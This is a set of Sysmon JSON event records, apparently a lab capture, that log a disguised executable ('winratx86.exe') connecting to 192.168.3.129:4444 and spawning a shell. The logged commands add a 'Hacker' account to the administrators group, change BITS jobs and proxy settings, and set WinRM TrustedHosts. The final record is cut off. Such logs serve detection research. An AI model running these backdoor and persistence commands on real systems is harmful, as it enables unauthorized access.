{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "3", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "3", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 22:30:55.737312", 
    "System.EventRecordID": "9728", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5044", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-02-25 19:39:10.431", 
    "EventData.Data.ProcessGuid": "{fcff22d0-8b9e-5ab1-0000-00107f7e9504}", 
    "EventData.Data.ProcessId": "1356", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\winratx86.exe", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.Protocol": "tcp", 
    "EventData.Data.Initiated": "True", 
    "EventData.Data.SourceIsIpv6": "False", 
    "EventData.Data.SourceIp": "10.45.10.128", 
    "EventData.Data.SourceHostname": "DESKTOP-66GAIL5.localdomain", 
    "EventData.Data.SourcePort": "49679", 
    "EventData.Data.SourcePortName": "", 
    "EventData.Data.DestinationIsIpv6": "False", 
    "EventData.Data.DestinationIp": "192.168.3.129", 
    "EventData.Data.DestinationHostname": "", 
    "EventData.Data.DestinationPort": "4444", 
    "EventData.Data.DestinationPortName": ""
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 22:33:16.291264", 
    "System.EventRecordID": "9731", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 22:33:16.289", 
    "EventData.Data.ProcessGuid": "{fcff22d0-8c2c-5ab1-0000-0010f10e9604}", 
    "EventData.Data.ProcessId": "440", 
    "EventData.Data.Image": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Interpr\u00e9teur de commandes Windows", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "C:\\Windows\\system32\\cmd.exe", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=50B930137463B14F73186C7C6767A2AA,SHA256=EB51A0C96F7DE6CE8BB0386429FFF83BF95CB23FA61EFE499B416F1CB0FC71C9", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-8b9e-5ab1-0000-00107f7e9504}", 
    "EventData.Data.ParentProcessId": "1356", 
    "EventData.Data.ParentImage": "C:\\Users\\ngatilio\\Desktop\\winratx86.exe", 
    "EventData.Data.ParentCommandLine": "\"C:\\Users\\ngatilio\\Desktop\\winratx86.exe\""
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 22:33:16.373806", 
    "System.EventRecordID": "9732", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 22:33:16.370", 
    "EventData.Data.ProcessGuid": "{fcff22d0-8c2c-5ab1-0000-0010610f9604}", 
    "EventData.Data.ProcessId": "4424", 
    "EventData.Data.Image": "C:\\Windows\\System32\\conhost.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Console Window Host", 
    "EventData.Data.Product": "Microsoft\u00ae Windows\u00ae Operating System", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", 
    "EventData.Data.CurrentDirectory": "C:\\Windows", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=24BFE27EC8759F56B539217585DA277C,SHA256=2109430C7459C29A5E3A8EDADFE4438DC6CD31EDC617DB23AC561B3446F1B23A", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-8c2c-5ab1-0000-0010f10e9604}", 
    "EventData.Data.ParentProcessId": "440", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "5", 
    "System.Version": "3", 
    "System.Level": "4", 
    "System.Task": "5", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 22:35:23.689066", 
    "System.EventRecordID": "9742", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 22:35:23.675", 
    "EventData.Data.ProcessGuid": "{fcff22d0-8b9e-5ab1-0000-00107f7e9504}", 
    "EventData.Data.ProcessId": "1356", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\winratx86.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:47:51.000925", 
    "System.EventRecordID": "9846", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 23:47:50.996", 
    "EventData.Data.ProcessGuid": "{fcff22d0-9da6-5ab1-0000-001015ad9e04}", 
    "EventData.Data.ProcessId": "4212", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\winratx86.exe", 
    "EventData.Data.FileVersion": "2.2.14", 
    "EventData.Data.Description": "ApacheBench command line utility", 
    "EventData.Data.Product": "Apache HTTP Server", 
    "EventData.Data.Company": "Apache Software Foundation", 
    "EventData.Data.CommandLine": "\"C:\\Users\\ngatilio\\Desktop\\winratx86.exe\"", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=ABF1BEC35CC5AFD6624CC25B27AEF9C7,SHA256=418D123C826534848268616A2D05A80D787C5C3723E297B0C6A88EC75EF60161", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-0bdd-5a8b-0000-00109c9a0200}", 
    "EventData.Data.ParentProcessId": "2860", 
    "EventData.Data.ParentImage": "C:\\Windows\\explorer.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\Explorer.EXE"
}
{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "3", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "3", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:47:52.247099", 
    "System.EventRecordID": "9847", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5044", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-02-25 20:56:06.898", 
    "EventData.Data.ProcessGuid": "{fcff22d0-9da6-5ab1-0000-001015ad9e04}", 
    "EventData.Data.ProcessId": "4212", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\winratx86.exe", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.Protocol": "tcp", 
    "EventData.Data.Initiated": "True", 
    "EventData.Data.SourceIsIpv6": "False", 
    "EventData.Data.SourceIp": "10.45.10.128", 
    "EventData.Data.SourceHostname": "DESKTOP-66GAIL5.localdomain", 
    "EventData.Data.SourcePort": "49680", 
    "EventData.Data.SourcePortName": "", 
    "EventData.Data.DestinationIsIpv6": "False", 
    "EventData.Data.DestinationIp": "192.168.3.129", 
    "EventData.Data.DestinationHostname": "", 
    "EventData.Data.DestinationPort": "4444", 
    "EventData.Data.DestinationPortName": ""
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:49:04.728830", 
    "System.EventRecordID": "9851", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 23:49:04.727", 
    "EventData.Data.ProcessGuid": "{fcff22d0-9df0-5ab1-0000-0010b0cf9e04}", 
    "EventData.Data.ProcessId": "1960", 
    "EventData.Data.Image": "C:\\Windows\\System32\\net1.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Net Command", 
    "EventData.Data.Product": "Microsoft\u00ae Windows\u00ae Operating System", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "C:\\Windows\\system32\\net1  user /add Sy Hacker", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=7F119D922C7213D1959C1198017390F6,SHA256=7CEDD01CE9B06EE1586A899B48FB734E5FE22A976F4D27BAB81ED0EE9F833D90", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9df0-5ab1-0000-0010ebce9e04}", 
    "EventData.Data.ParentProcessId": "4936", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\net.exe", 
    "EventData.Data.ParentCommandLine": "net  user /add Sy Hacker"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:50:01.032553", 
    "System.EventRecordID": "9856", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 23:50:01.031", 
    "EventData.Data.ProcessGuid": "{fcff22d0-9e29-5ab1-0000-001011f09e04}", 
    "EventData.Data.ProcessId": "1652", 
    "EventData.Data.Image": "C:\\Windows\\System32\\net1.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Net Command", 
    "EventData.Data.Product": "Microsoft\u00ae Windows\u00ae Operating System", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "C:\\Windows\\system32\\net1  localgroup administrators Sy Hacker", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=7F119D922C7213D1959C1198017390F6,SHA256=7CEDD01CE9B06EE1586A899B48FB734E5FE22A976F4D27BAB81ED0EE9F833D90", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9e29-5ab1-0000-00106fef9e04}", 
    "EventData.Data.ParentProcessId": "4840", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\net.exe", 
    "EventData.Data.ParentCommandLine": "net  localgroup administrators Sy Hacker"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "5", 
    "System.Version": "3", 
    "System.Level": "4", 
    "System.Task": "5", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:57:13.146856", 
    "System.EventRecordID": "9877", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 23:57:13.138", 
    "EventData.Data.ProcessGuid": "{fcff22d0-9fd9-5ab1-0000-00102010a004}", 
    "EventData.Data.ProcessId": "752", 
    "EventData.Data.Image": "C:\\Windows\\System32\\bitsadmin.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:58:33.863470", 
    "System.EventRecordID": "9879", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 23:58:33.858", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a029-5ab1-0000-0010ac3da004}", 
    "EventData.Data.ProcessId": "2516", 
    "EventData.Data.Image": "C:\\Windows\\System32\\bitsadmin.exe", 
    "EventData.Data.FileVersion": "7.8.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Utilitaire d\u2019administration BITS", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "bitsadmin  /addfile jobhack http://download/porn/", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=BC3FC615DED204BA43B3B5EE76E7AA32,SHA256=452EB204875973149566FED16FE8869F3EE9CB11961B50DD088E5EFB5A093889", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "5", 
    "System.Version": "3", 
    "System.Level": "4", 
    "System.Task": "5", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-20 23:58:33.889002", 
    "System.EventRecordID": "9880", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-20 23:58:33.873", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a029-5ab1-0000-0010ac3da004}", 
    "EventData.Data.ProcessId": "2516", 
    "EventData.Data.Image": "C:\\Windows\\System32\\bitsadmin.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:02:26.705330", 
    "System.EventRecordID": "9885", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:02:26.700", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a112-5ab1-0000-0010f3d7a004}", 
    "EventData.Data.ProcessId": "4268", 
    "EventData.Data.Image": "C:\\Windows\\System32\\bitsadmin.exe", 
    "EventData.Data.FileVersion": "7.8.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Utilitaire d\u2019administration BITS", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "bitsadmin  /util /setieproxy localsystem AUTODETECT", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=BC3FC615DED204BA43B3B5EE76E7AA32,SHA256=452EB204875973149566FED16FE8869F3EE9CB11961B50DD088E5EFB5A093889", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:06:21.249256", 
    "System.EventRecordID": "9897", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:06:21.245", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a1fd-5ab1-0000-0010738ea104}", 
    "EventData.Data.ProcessId": "2016", 
    "EventData.Data.Image": "C:\\Windows\\System32\\bitsadmin.exe", 
    "EventData.Data.FileVersion": "7.8.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Utilitaire d\u2019administration BITS", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "bitsadmin  /util /setieproxy localsystem MANUAL_PROXY 192.168.3.129:80 NULL", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=BC3FC615DED204BA43B3B5EE76E7AA32,SHA256=452EB204875973149566FED16FE8869F3EE9CB11961B50DD088E5EFB5A093889", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:20:51.633036", 
    "System.EventRecordID": "9924", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:20:51.628", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a563-5ab1-0000-00107ecfa304}", 
    "EventData.Data.ProcessId": "5420", 
    "EventData.Data.Image": "C:\\Windows\\System32\\bitsadmin.exe", 
    "EventData.Data.FileVersion": "7.8.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Utilitaire d\u2019administration BITS", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "\"C:\\Windows\\system32\\bitsadmin.exe\" /list", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=BC3FC615DED204BA43B3B5EE76E7AA32,SHA256=452EB204875973149566FED16FE8869F3EE9CB11961B50DD088E5EFB5A093889", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-a25b-5ab1-0000-001052c1a104}", 
    "EventData.Data.ParentProcessId": "5436", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 
    "EventData.Data.ParentCommandLine": "powershell"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:37:15.222231", 
    "System.EventRecordID": "9959", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:37:15.217", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a93b-5ab1-0000-00102126a604}", 
    "EventData.Data.ProcessId": "5568", 
    "EventData.Data.Image": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Interpr\u00e9teur de commandes Windows", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Windows\\system32\\winrm.cmd\" s winrm/config/client @{TrustedHosts=\"10.45.10.146\"}\"", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=50B930137463B14F73186C7C6767A2AA,SHA256=EB51A0C96F7DE6CE8BB0386429FFF83BF95CB23FA61EFE499B416F1CB0FC71C9", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-a25b-5ab1-0000-001052c1a104}", 
    "EventData.Data.ParentProcessId": "5436", 
